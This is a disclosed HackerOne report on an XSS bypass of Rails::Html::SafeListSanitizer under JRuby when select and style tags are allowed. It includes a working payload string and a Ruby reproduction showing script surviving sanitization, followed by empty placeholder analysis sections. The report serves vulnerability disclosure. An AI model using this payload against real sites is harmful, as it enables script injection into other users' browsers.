---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1530898'
original_report_id: '1530898'
title: Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that
  allows the style tag
weakness: Cross-site Scripting (XSS) - Generic
team_handle: rails
created_at: '2022-04-05T07:34:03.628Z'
disclosed_at: '2022-06-14T03:49:29.284Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: https://github.com/rails/rails
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag

## Metadata

- HackerOne Report ID: 1530898
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: rails
- Disclosed At: 2022-06-14T03:49:29.284Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

It seems to be a problem caused by a difference between the nokogiri java implementation and the ruby implementation.
It seems to be an ambiguous case as to whether to do it with nokogiri or have rails-html-sanitizer defend it.

jruby9.3.3.0 (nokogiri java), use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag
code
```
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

result
```
input: <select<style/>W<xmp<script>alert(1)</script>
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;
scrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>
scrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>
scrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>
output: <select><style>W<script>alert(1)</script></style></select>
```

## Impact

It is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
